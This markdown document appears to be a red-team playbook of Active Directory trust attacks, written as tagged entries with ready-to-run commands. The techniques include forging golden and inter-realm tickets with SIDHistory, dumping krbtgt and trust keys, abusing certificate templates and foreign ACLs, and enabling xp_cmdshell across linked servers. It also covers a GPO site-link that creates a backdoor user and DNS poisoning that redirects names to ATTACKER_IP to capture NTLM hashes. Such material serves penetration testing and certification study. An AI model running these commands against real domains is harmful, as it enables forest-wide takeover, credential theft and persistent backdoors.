# AD Trust Attacks — Child-to-Parent & Cross-Forest

> **Pre-req:** `source /opt/venvTools/bin/activate`

## Child-to-Parent Domain Escalation (Golden Ticket with SIDHistory)

### Full Chain: Child Domain → Parent Domain Enterprise Admin [added: 2026-04]
- **Tags:** #GoldenTicket #SIDHistory #ChildToParent #EnterpriseAdmin #Mimikatz #Rubeus #Impacket #T1558.001
- **Trigger:** Compromised child domain DC or obtained krbtgt hash of child domain
- **Prereq:** Child domain krbtgt hash; child domain SID; parent domain Enterprise Admins SID
- **Yields:** Enterprise Admin access in parent domain via golden ticket with SIDHistory injection
- **Opsec:** High
- **Context:** Compromised child domain DC or have krbtgt hash of child — forge Golden Ticket with parent Enterprise Admins SID in SIDHistory field
- **Payload/Method:**

**Step 1 — Gather required values:**
```powershell
# Get child domain krbtgt hash
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# Get child domain SID
Get-DomainSID
# or: lookupsid.py child.domain.local/user@<CHILD_DC_IP> | grep "Domain SID"

# Get Enterprise Admins group SID from parent domain
Get-DomainGroup -Domain PARENT.DOMAIN.LOCAL -Identity "Enterprise Admins" | \
  select distinguishedname,objectsid
# or: lookupsid.py child.domain.local/user@<PARENT_DC_IP> | grep -B12 "Enterprise Admins"
```

**Step 2a — Forge Golden Ticket (Windows / Mimikatz):**
```
mimikatz # kerberos::golden \
  /user:hacker \
  /domain:CHILD.DOMAIN.LOCAL \
  /sid:S-1-5-21-<child-domain-sid> \
  /krbtgt:<child-krbtgt-nthash> \
  /sids:S-1-5-21-<parent-domain-sid>-519 \
  /ptt
```

**Step 2b — Forge Golden Ticket (Windows / Rubeus):**
```powershell
.\Rubeus.exe golden \
  /rc4:<child-krbtgt-nthash> \
  /domain:CHILD.DOMAIN.LOCAL \
  /sid:S-1-5-21-<child-domain-sid> \
  /sids:S-1-5-21-<parent-domain-sid>-519 \
  /user:hacker /ptt
```

**Step 2c — Forge Golden Ticket (Linux / Impacket):**
```bash
ticketer.py \
  -nthash <child-krbtgt-nthash> \
  -domain CHILD.DOMAIN.LOCAL \
  -domain-sid S-1-5-21-<child-domain-sid> \
  -extra-sid S-1-5-21-<parent-domain-sid>-519 \
  hacker

export KRB5CCNAME=hacker.ccache
psexec.py CHILD.DOMAIN.LOCAL/hacker@dc01.domain.local -k -no-pass -target-ip <PARENT_DC_IP>
```

**Step 3 — Access parent DC:**
```
ls \\dc01.domain.local\c$
```

### Automated Child-to-Parent (raiseChild.py) [added: 2026-04]
- **Tags:** #raiseChild #ChildToParent #Impacket #AutoEscalation #GoldenTicket #T1558.001
- **Trigger:** Child domain DA obtained; want quick automated escalation to parent
- **Prereq:** Child domain DA credentials; Impacket raiseChild.py; network access to parent DC
- **Yields:** Automated parent domain access (handles SID lookup, golden ticket, and DCSync)
- **Opsec:** High
- **Context:** Quick automated escalation from child to parent
- **Payload/Method:**
  ```bash
  raiseChild.py -target-exec <PARENT_DC_IP> CHILD.DOMAIN.LOCAL/<domain_admin_user>
  ```

## Cross-Forest Trust Attacks

### Cross-Forest Kerberoasting [added: 2026-04]
- **Tags:** #CrossForest #Kerberoasting #ForestTrust #Rubeus #GetUserSPNs #Impacket #T1558.003
- **Trigger:** Bidirectional forest trust discovered; looking for service accounts in trusted forest
- **Prereq:** Valid credentials in current domain; bidirectional forest trust exists
- **Yields:** TGS hashes of service accounts in trusted forest for offline cracking
- **Opsec:** Med
- **Context:** Bidirectional forest trust exists — accounts in trusted forest may have SPNs, kerberoastable from here
- **Payload/Method:**
  ```powershell
  # Enumerate SPNs in trusted forest
  Get-DomainUser -SPN -Domain TRUSTED.FOREST.LOCAL | select SamAccountName
  Get-DomainUser -Domain TRUSTED.FOREST.LOCAL -Identity mssqlsvc | \
    select samaccountname,memberof

  # Kerberoast cross-forest
  .\Rubeus.exe kerberoast /domain:TRUSTED.FOREST.LOCAL /user:mssqlsvc /nowrap
  # OR from Linux:
  GetUserSPNs.py -request -target-domain TRUSTED.FOREST.LOCAL CURRENT.DOMAIN.LOCAL/user
  ```

### Cross-Forest Foreign Group Members (SID Filtering Bypass Research) [added: 2026-04]
- **Tags:** #CrossForest #ForeignGroup #SIDFiltering #TrustAbuse #DomainForeignGroupMember #T1482
- **Trigger:** Forest trusts identified; looking for cross-forest access paths via group membership
- **Prereq:** PowerView loaded; valid domain user context
- **Yields:** Users from one forest in groups of another (unexpected cross-forest access paths)
- **Opsec:** Low
- **Context:** Users from one forest in groups of another — may have unexpected access
- **Payload/Method:**
  ```powershell
  # Find groups with members from foreign domains/forests
  Get-DomainForeignGroupMember -Domain TRUSTED.FOREST.LOCAL

  # Find users who are in groups outside their own domain
  Get-DomainForeignUser
  Get-DomainTrustMapping  # full trust graph
  ```

## Trust Enumeration

```powershell
# AD Module
Get-ADTrust -Filter *
Import-Module activedirectory; Get-ADTrust -Filter *

# PowerView
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping  # recursive — maps all trusts seen

# Impacket
lookupsid.py DOMAIN/user@dc-ip
```

## Domain Trust Abuse via Trust Key (Alternative to krbtgt Hash)

### Inter-Realm TGT Forgery Using Trust Account Key [added: 2026-04]
- **Tags:** #TrustKey #InterRealm #GoldenTicket #TrustAccount #DCSync #StealthEscalation #T1558.001
- **Trigger:** Child domain DA obtained; want stealthier alternative to krbtgt-based golden ticket
- **Prereq:** DA on child domain; ability to DCSync trust account hash (currentdomain\targetdomain$)
- **Yields:** Inter-realm TGT using trust key (stealthier: uses DC group SIDs, less noisy in logs)
- **Opsec:** Med
- **Context:** DA on child domain — use trust account hash instead of krbtgt to forge inter-realm ticket (stealthier: uses -516/S-1-5-9 SIDs to masquerade as DC group, less noisy in logs)
- **Payload/Method:**
  ```
  # From child DC: dump trust account hash (currentdomain\targetdomain$ account)
  lsadump::dcsync /user:DOLLARCORP\MONEYCORP$  # trust account for parent domain
  # or: lsadump::lsa /patch  → look for MONEYCORP$ account

  # Forge inter-realm TGT using trust key
  kerberos::golden /domain:dollarcorp.moneycorp.local \
    /sid:S-1-5-21-<child-sid> \
    /sids:S-1-5-21-<parent-sid>-516,S-1-5-9 \
    /rc4:<trust-account-hash> \
    /user:Administrator \
    /service:krbtgt \
    /target:moneycorp.local \
    /ticket:mcorp-ticket.kirbi
    # Note: /sids *-516 = Domain Controllers group, S-1-5-9 = Enterprise Domain Controllers
    # This is less noisy than using -519 (Enterprise Admins)

  # Request TGS for target service using the inter-realm TGT
  .\Rubeus.exe asktgs /ticket:mcorp-ticket.kirbi \
    /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local \
    /ptt

  # If having KDC_ERR_WRONG_REALM errors, add /target flag to kerberos::golden
  ```

### Cross-Forest Impersonation via Trust Key [added: 2026-04]
- **Tags:** #CrossForest #TrustKey #InterRealm #ForestTrust #Impersonation #T1558.001
- **Trigger:** Bidirectional forest trust; want to impersonate users in target forest services
- **Prereq:** DA in source domain; ability to DCSync inter-forest trust key
- **Yields:** Access to target forest services via forged inter-realm TGT
- **Opsec:** Med
- **Context:** Bidirectional forest trust — impersonate a user from source domain in target forest's services
- **Payload/Method:**
  ```
  # Extract inter-forest trust key
  lsadump::dcsync /user:DOLLARCORP\EUCORP$  # trust account for foreign forest

  # Forge TGT for foreign forest
  Kerberos::golden /user:Administrator /service:krbtgt \
    /domain:dollarcorp.moneycorp.local \
    /sid:S-1-5-21-<source-domain-sid> \
    /rc4:<trust-key-hash> \
    /target:eucorp.local \
    /ticket:eucorp-tgt.kirbi

  # Use it to request CIFS on target forest's DC
  .\Rubeus.exe asktgs /ticket:eucorp-tgt.kirbi \
    /service:cifs/eucorp-dc.eucorp.local \
    /dc:eucorp-dc.eucorp.local /ptt
  ```

### Adalanche AD Trust Mapping [added: 2026-04]
- **Tags:** #Adalanche #TrustMapping #ADVisualization #TrustEnum #GraphAnalysis #T1482
- **Trigger:** Need visual trust enumeration and attack path analysis
- **Prereq:** Adalanche binary; valid domain credentials or collected data
- **Yields:** Visual trust map and attack path graph via Adalanche GUI
- **Opsec:** Med
- **Context:** Visual trust enumeration and attack path analysis using Adalanche collector + GUI.
- **Payload/Method:**
```
# Collect AD data
.\Adalanche.exe collect activedirectory --domain target.ad

# In Adalanche GUI, query all trusts:
(objectClass=trustedDomain)
```

### Configuration Naming Context ACL Abuse (Intra-Forest) [added: 2026-04]
- **Tags:** #ConfigNC #ACLAbuse #CertificateTemplate #GPOSiteLinking #ForestEscalation #T1222
- **Trigger:** Child domain user/group has GenericAll/Write on CN=Configuration (shared forest NC)
- **Prereq:** Write access on Configuration Naming Context objects
- **Yields:** Ability to modify certificate templates, GPO site links, or schema (forest-wide impact)
- **Opsec:** High
- **Context:** If a child domain user/group has GenericAll/Write on CN=Configuration (shared across forest), they can modify certificate templates, GPO links to sites, or schema.
- **Payload/Method:**
```powershell
# Enumerate ACLs for WRITE access on Configuration NC
\$dn = "CN=Configuration,DC=PARENT,DC=AD"
\$acl = Get-Acl -Path "AD:\\$dn"
\$acl.Access | Where-Object {\$_.ActiveDirectoryRights -match "GenericAll|Write" }

# If writable: abuse via certificate template modification or GPO site linking
```

### Cross-Trust Certificate Abuse via Certify (ESC1 Variant) [added: 2026-04]
- **Tags:** #ADCS #Certify #ESC1 #CrossTrust #CertificateAbuse #AltName #T1649
- **Trigger:** Child domain user with enrollment rights on parent CA template allowing SAN
- **Prereq:** Enrollment rights on parent domain CA template with SAN/altname allowed
- **Yields:** Certificate as parent domain admin; TGT for parent domain admin
- **Opsec:** Med
- **Context:** Child domain user with enrollment rights on parent domain CA template that allows altname (SAN). Request cert as parent domain admin.
- **Payload/Method:**
```powershell
# Request cert from parent CA with altname impersonating parent admin
.\Certify.exe request /ca:parent.ad\PARENT-DC01-CA /domain:parent.ad /template:"Copy of User" /altname:PARENT\Administrator

# Use the PFX to get a TGT as parent admin
.\Rubeus.exe asktgt /domain:parent.ad /user:Administrator /certificate:cert.pfx /ptt
```

### GPO Site-Linking for Cross-Domain Persistence [added: 2026-04]
- **Tags:** #GPO #SiteLinking #CrossDomain #Persistence #ConfigNC #ImmediateTask #T1484.001
- **Trigger:** SYSTEM on child DC with write access to Configuration NC
- **Prereq:** SYSTEM on child domain DC; write access to Configuration Naming Context
- **Yields:** GPO execution on all DCs in parent domain site (cross-domain persistence)
- **Opsec:** High
- **Context:** SYSTEM-level access on child domain DC + write access to Configuration NC. Create a GPO in child domain and link it to the Default-First-Site in parent domain's Sites container. The GPO runs on all DCs in that site.
- **Payload/Method:**
```powershell
# Create malicious GPO in child domain
\$gpo = "Backdoor"
New-GPO \$gpo

# Add immediate scheduled task (adds backdoor user)
New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user backdoor B@ckdoor123 /add"

# Find parent DC site
Get-ADDomainController -Server parent.ad | Select ServerObjectDN

# Link GPO to default site (crosses domain boundary via shared Configuration NC)
\$sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=PARENT,DC=AD"
New-GPLink -Name "Backdoor" -Target \$sitePath -Server child.parent.ad
```

### GoldenGMSA Cross-Domain Abuse [added: 2026-04]
- **Tags:** #GoldenGMSA #gMSA #CrossDomain #KDSRootKey #ManagedServiceAccount #T1555
- **Trigger:** gMSA accounts found shared across domains in forest; KDS root key extractable
- **Prereq:** Access to KDS root key (via child domain) or PrincipalsAllowedToRetrieve membership
- **Yields:** gMSA password computed offline; NT hash for pass-the-hash
- **Opsec:** Med
- **Context:** gMSA accounts can be shared across domains in a forest. If a child domain principal is in PrincipalsAllowedToRetrieveManagedPassword, or you can extract the KDS root key, compute the gMSA password offline.
- **Payload/Method:**
```powershell
# Create gMSA (for reference — attacker finds existing ones)
New-ADServiceAccount -Name "apache-dev" -DNSHostName "parent.ad" -PrincipalsAllowedToRetrieveManagedPassword <authorized_principal> -Enabled \$True

# Enumerate gMSA accounts
.\GoldenGMSA.exe gmsainfo --domain parent.ad

# Retrieve KDS root key info from child domain
.\GoldenGMSA.exe kdsinfo --forest child.parent.ad

# Compute gMSA password using SID (online — queries AD)
.\GoldenGMSA.exe compute --sid "S-1-5-21-XXXX-1106" --forest child.parent.ad --domain parent.ad

# Compute gMSA password offline (with extracted KDS key)
.\GoldenGMSA.exe compute --sid "S-1-5-21-XXXX-1106" --kdskey AQAAAAwsk...

# Convert raw password to NT hash for PTH
import base64, hashlib
base64_input = "<base64_password>"
print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())
```

### Wildcard DNS Poisoning + LLMNR/NBNS Relay (Intra-Forest) [added: 2026-04]
- **Tags:** #WildcardDNS #ADIDNS #Powermad #Inveigh #DNSPoisoning #NTLMCapture #T1557
- **Trigger:** Authenticated user in child domain; ADIDNS permissions allow wildcard record creation
- **Prereq:** Valid domain credentials; ADIDNS write permission in parent domain zone
- **Yields:** NTLMv2 hashes from all unresolvable name queries in parent domain
- **Opsec:** High
- **Context:** Authenticated user in child domain can add wildcard DNS record in parent domain zone (if ADIDNS permissions allow). All unresolvable names in parent domain resolve to attacker IP, enabling NTLM hash capture.
- **Payload/Method:**
```powershell
# Check if a non-existent name resolves (if not, wildcard not set yet)
Resolve-DNSName DOESNOTEXIST.parent.ad

# Add wildcard DNS record pointing to attacker IP
Import-module Powermad.ps1
New-ADIDNSNode -Node * -domainController DC01.parent.ad -Domain parent.ad -Zone parent.ad -Tombstone -Verbose

# Optionally: modify an existing DNS record (e.g., redirect a server)
\$Old = Get-DnsServerResourceRecord -ComputerName DC01.parent.ad -ZoneName parent.ad -Name TARGET01
\$New = \$Old.Clone()
\$TTL = [System.TimeSpan]::FromSeconds(1)
\$New.TimeToLive = \$TTL
\$New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('ATTACKER_IP')
Set-DnsServerResourceRecord -NewInputObject \$New -OldInputObject \$Old -ComputerName DC01.parent.ad -ZoneName parent.ad

# Start Inveigh to capture NTLMv2 hashes
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y

# Crack captured hashes
hashcat -m 5600 captured_ntlmv2 /usr/share/wordlists/rockyou.txt
```

### Cross-Domain Whisker + S4U Chain (Shadow Credentials) [added: 2026-04]
- **Tags:** #Whisker #S4U #ShadowCredentials #CrossDomain #KeyCredentialLink #Rubeus #T1556
- **Trigger:** GenericAll/GenericWrite on parent domain computer from child domain principal
- **Prereq:** Write access on parent domain computer object; Whisker and Rubeus binaries
- **Yields:** Admin access on parent domain machine via shadow credential + S4U impersonation
- **Opsec:** Med
- **Context:** Have write access (GenericAll/GenericWrite) on a parent domain computer object from a child domain principal. Use Whisker to set msDS-KeyCredentialLink, then S4U2self to impersonate admin on that machine.
- **Payload/Method:**
```powershell
# Add shadow credential on parent domain DC
.\Whisker.exe add /target:DC01\$ /domain:parent.ad

# Use the generated certificate to S4U2self + altservice for CIFS
.\Rubeus.exe s4u /dc:DC01.parent.ad /ticket:<WHISKER_OUTPUT_B64> /impersonateuser:administrator@parent.ad /ptt /self /service:host/DC01.parent.ad /altservice:cifs/DC01.parent.ad
```

### Shadow Principals in Bastion Forests [added: 2026-04]
- **Tags:** #ShadowPrincipal #BastionForest #RedForest #PAM #PrivilegedAccessManagement #T1078
- **Trigger:** Bastion/red forest architecture detected; shadow principal configuration found
- **Prereq:** Access to bastion forest; write access to Shadow Principal Configuration container
- **Yields:** Escalation to privileged accounts in bastion forest via shadow principal manipulation
- **Opsec:** Med
- **Context:** In a bastion/red forest architecture, shadow principals map users from production forest to privileged accounts in the bastion forest. If you compromise the bastion, enumerate and abuse these mappings.
- **Payload/Method:**
```powershell
# Enumerate shadow principals
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl

# Add a controlled account to an existing shadow principal (requires write access)
Set-ADObject -Identity "CN=Tom,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=corp" -Add @{'member'="CN=AttackerUser,CN=Users,DC=bastion,DC=corp"} -Verbose
```

### Cross-Forest SQL Server Linked Server Abuse [added: 2026-04]
- **Tags:** #SQLServer #LinkedServer #CrossForest #PowerUpSQL #xp_cmdshell #OPENQUERY #T1210
- **Trigger:** SQL Server with linked servers to another forest discovered
- **Prereq:** MSSQL access in source forest; linked server configured to target forest
- **Yields:** Cross-forest query execution and potential RCE via linked server xp_cmdshell
- **Opsec:** Med
- **Context:** SQL Server in Forest A has a linked server to SQL in Forest B. Enumerate links and execute queries cross-forest for lateral movement.
- **Payload/Method:**
```powershell
# Enumerate SQL Server links (PowerUpSQL)
Get-SQLServerLink

# Check login rights on linked server
Get-SQLQuery -Query "EXEC sp_helplinkedsrvlogin"

# Connect cross-forest via Impacket
mssqlclient.py jimmy@10.x.x.x -windows-auth

# Execute queries on linked server (from SQL context)
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER')
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [LINKED_SERVER]
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LINKED_SERVER]
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]
```

### Inter-Realm Trust Key Extraction via GUID [added: 2026-04]
- **Tags:** #TrustKey #GUID #DCSync #InterRealm #SIDFiltering #ftinfo #T1558.001
- **Trigger:** Need trust key but only have objectGUID of trusted domain object
- **Prereq:** DCSync rights in current domain; objectGUID of trusted domain object
- **Yields:** Inter-realm trust key for ticket forging; SID filtering details
- **Opsec:** Med
- **Context:** Extract inter-realm trust key using the objectGUID of the trusted domain object. Useful when you know the GUID but not the trust account name.
- **Payload/Method:**
```powershell
# Get GUID for target trusted domain object
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' | select name,objectguid

# DCSync using GUID to retrieve inter-realm trust key
mimikatz # lsadump::dcsync /guid:{8d52f9da-361b-4dc3-8fa7-af5f282fa741}

# Parse forest trust info for SID filtering details
python3 ftinfo.py  # parses msDS-TrustForestTrustInfo attribute

# Get local SID of remote server (useful for cross-forest silver tickets)
proxychains python getlocalsid.py domain.ad/Administrator@SQL02.target.ad SQL02
```

### Foreign ACL Enumeration and Exploitation (Full Chain) [added: 2026-04]
- **Tags:** #ForeignACL #CrossDomain #ACLAbuse #GenericWrite #WriteDACL #ForceChangePassword #T1222
- **Trigger:** Users in one domain have ACL rights on objects in trusted domain
- **Prereq:** Valid credentials in source domain; ACL rights on objects in target domain
- **Yields:** Cross-domain privilege escalation via foreign ACL abuse (password reset, group add)
- **Opsec:** Med
- **Context:** Users in one domain may have ACL-based rights (GenericWrite, WriteDACL, etc.) on objects in a trusted domain. Enumerate all foreign ACL principals and abuse them.
- **Payload/Method:**
```powershell
# Enumerate foreign security principals in target domain
Get-DomainObject -LDAPFilter '(objectclass=ForeignSecurityPrincipal)' -Domain target.ad

# Enumerate ALL foreign ACLs (objects where non-local SIDs have write access)
\$Domain = "parent.ad"
\$DomainSid = Get-DomainSid \$Domain
Get-DomainObjectAcl -Domain \$Domain -ResolveGUIDs -Identity * | ? {
    (\$_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and
    (\$_.AceType -match 'AccessAllowed') -and
    (\$_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}\$') -and
    (\$_.SecurityIdentifier -notmatch \$DomainSid)
}

# Convert foreign SID to username
ConvertFrom-SID S-1-5-21-XXXX-2103

# Abuse: Reset password cross-domain (if ForceChangePassword ACL)
Set-DomainUserPassword -identity jessica -AccountPassword \$pass -domain target.ad -verbose

# Abuse: Add to group cross-domain (if GenericWrite on group)
Add-DomainGroupMember -identity 'Infrastructure' -Members 'CHILD\rita' -Domain parent.ad -Verbose
```

### SIDHistory Enumeration for Cross-Forest Persistence [added: 2026-04]
- **Tags:** #SIDHistory #CrossForest #Persistence #MigratedAccounts #TokenAbuse #T1134.005
- **Trigger:** Looking for migrated accounts with SIDHistory entries for cross-forest access
- **Prereq:** Valid domain credentials; RSAT or PowerView
- **Yields:** Users with SIDHistory granting access to old forest resources
- **Opsec:** Low
- **Context:** Users migrated between forests may retain SIDHistory entries granting access to old forest resources. Enumerate and abuse these.
- **Payload/Method:**
```powershell
# Find users with SIDHistory set
Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory

# These users can access resources in the old domain using their SIDHistory SID
# Create sacrificial logon session and inject their ticket
.\Rubeus.exe createnetonly /program:powershell.exe /show
```

## Additional Trust Techniques (Sliver / CRTE / Misc)

### Cross-Forest TGS via Bidirectional External Trust (LabManual Sliver) [added: 2026-04]
- **Tags:** #CrossForest #ExternalTrust #Sliver #Rubeus #InterRealm #TGS #T1558
- **Trigger:** Bidirectional external trust discovered (trustAttributes=4); DA creds available
- **Prereq:** DA credentials in source domain; Sliver session; bidirectional external trust
- **Yields:** Access to shared resources in foreign forest via inter-realm TGT/TGS chain
- **Opsec:** Med
- **Context:** dollarcorp has bidirectional external trust to eurocorp. Use DA creds to request inter-realm TGT and access shared resources.
- **Payload/Method:**
```
# Step 1: Identify external trust (trustAttributes=4)
[server] sliver (session) > execute-assembly ... ADSearch.exe '--search "(trustAttributes=4)" --attributes cn,trustDirection,trustPartner --json'

# Step 2: Request inter-realm TGT for eurocorp
[server] sliver (session) > inline-execute-assembly -t 40 '/path/Rubeus.exe' 'asktgt /user:Administrator /domain:dollarcorp.moneycorp.local /certificate:<PFX> /password:Passw0rd! /dc:dcorp-dc /nowrap'

# Step 3: Request TGS for target service on eurocorp-dc
[server] sliver (session) > inline-execute-assembly -t 40 '/path/Rubeus.exe' 'asktgs /service:CIFS/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:<BASE64_TGT>'

# Step 4: Access shared resource
[server] sliver (session) > ls '\\eurocorp-dc.eurocorp.local\SharedwithDcorp'
```

### Enumerate Forest Trusts via LDAP Query (LabManual Sliver) [added: 2026-04]
- **Tags:** #TrustEnum #LDAP #ADSearch #Sliver #ForestTrust #ExternalTrust #T1482
- **Trigger:** Need to enumerate all trusts including cross-forest from Sliver session
- **Prereq:** Sliver session on domain-joined host; ADSearch.exe accessible
- **Yields:** Complete trust map including cross-forest and external trusts with attributes
- **Opsec:** Low
- **Context:** Enumerate all trusts including cross-forest to understand pivot possibilities.
- **Payload/Method:**
```
# All trusts
[server] sliver (session) > execute-assembly ... ADSearch.exe '--search "(objectClass=trustedDomain)" --attributes cn,flatName,trustAttributes,trustDirection,trustPartner --json'

# External trusts only (SID filtering enabled = trustAttributes=4)
[server] sliver (session) > execute-assembly ... ADSearch.exe '-d domain.local --search "(trustAttributes=4)" --attributes cn,trustDirection,trustPartner --json'
```

### Domain Trust Enumeration with AD Module (CRTE Exam Report) [added: 2026-04]
- **Tags:** #TrustEnum #ADModule #GetADTrust #LDAP #NonTriggering #Reconnaissance #T1482
- **Trigger:** Need to enumerate trusts using non-triggering LDAP-based method
- **Prereq:** AD Module DLLs available; domain-joined host
- **Yields:** Complete domain trust information via LDAP (minimal detection footprint)
- **Opsec:** Low
- **Context:** Enumerate domain trusts from a foothold using AD Module (non-triggering, uses LDAP).
- **Payload/Method:**
```powershell
Import-Module C:\path\ADModule\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\path\ADModule\ActiveDirectory\ActiveDirectory.psd1

Get-ADTrust -Filter *
```

### SID Brute Forcing via lookupsid.py [added: 2026-04]
- **Tags:** #lookupsid #RIDBrute #SIDEnum #AccountDiscovery #HiddenAccounts #Impacket #T1087.002
- **Trigger:** Need to enumerate all RIDs to discover users, groups, and hidden accounts
- **Prereq:** Valid domain credentials; Impacket lookupsid.py
- **Yields:** All domain users, groups, and their SIDs including hidden/protected accounts
- **Opsec:** Low
- **Context:** Enumerate all RIDs in a domain to discover users, groups, and their SIDs -- useful for finding hidden/protected accounts
- **Payload/Method:** `lookupsid.py DOMAIN.LOCAL/user@<DC_IP>`

### Cross-Domain ACL Abuse — DC AddMember to Foreign Domain Group (CRTE Exam Report) [added: 2026-04]
- **Tags:** #CrossDomain #ACLAbuse #AddMember #BloodHound #ScheduledTask #ForeignGroup #T1222
- **Trigger:** BloodHound reveals DC has AddMember rights on group in different domain
- **Prereq:** Compromised DC with AddMember ACL on foreign domain group; network route to foreign DC
- **Yields:** Membership addition in foreign domain group for cross-domain privilege escalation
- **Opsec:** Med
- **Context:** BloodHound reveals a compromised DC has `AddMember` rights on a group in a *different* domain. Leverage this to escalate into the foreign domain.
- **Payload/Method:**
  ```powershell
  # Step 1: Identify cross-domain ACL in BloodHound (Outbound Object Control → AddMember on foreign group)

  # Step 2: Direct Add-ADGroupMember may fail cross-domain. Write a script instead:
  # addMember.ps1 content:
  # Import-Module ActiveDirectory
  # Add-ADGroupMember -Identity <FOREIGN_GROUP> -Members 'CN=<USER>,CN=Users,DC=<FOREIGN_DOMAIN_PART1>,DC=<FOREIGN_DOMAIN_PART2>' -Server <FOREIGN_DC_FQDN>

  # Step 3: Transfer script to the DC with AddMember rights
  # (via PSSession Copy-Item chain through intermediate hosts if no direct route)

  # Step 4: Execute via scheduled task (if PSRemoting returns errors)
  schtasks /create /S <DC_WITH_ACL_FQDN> /SC Once /RU "NT AUTHORITY\SYSTEM" /TN "AddMember" /TR "powershell -ep bypass -f C:\programdata\addMember.ps1" /ST 00:00
  schtasks /run /S <DC_WITH_ACL_FQDN> /TN "AddMember"

  # Step 5: Verify membership from foothold
  Get-ADGroupMember -Identity <FOREIGN_GROUP>

  # Step 6: Re-logon to refresh token, then access machines where group is privileged
  ```
- **Key Insight:** Machine accounts (especially DCs) can hold ACL rights on objects in foreign domains via forest trusts. BloodHound's cross-domain edges reveal these paths. Scheduled tasks are a reliable fallback when PSRemoting fails for cross-domain group operations.
